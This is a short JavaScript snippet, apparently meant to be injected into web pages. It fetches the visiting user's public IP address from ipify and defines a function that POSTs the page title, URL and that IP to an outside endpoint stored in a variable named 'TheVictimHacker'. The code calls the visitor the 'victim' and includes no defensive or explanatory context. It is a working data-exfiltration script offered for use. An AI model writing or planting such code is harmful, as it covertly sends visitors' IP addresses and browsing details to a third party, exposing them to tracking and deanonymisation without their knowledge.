console.log("Fetcher included! :)")
function victimIPGET()
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://api64.ipify.org", false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
let victimIP = victimIPGET()
console.log(victimIP)

function sendVictimIP(){
const xhr = new XMLHttpRequest();

// listen for `load` event

// create a JSON object
const json = {
    "title": document.title,
    "url": window.location,
    "ip": victimIP
};

// open request
xhr.open('POST', TheVictimHacker);

// set `Content-Type` header
xhr.setRequestHeader('Content-Type', 'application/json');

// send rquest with JSON payload
xhr.send(JSON.stringify(json));
}
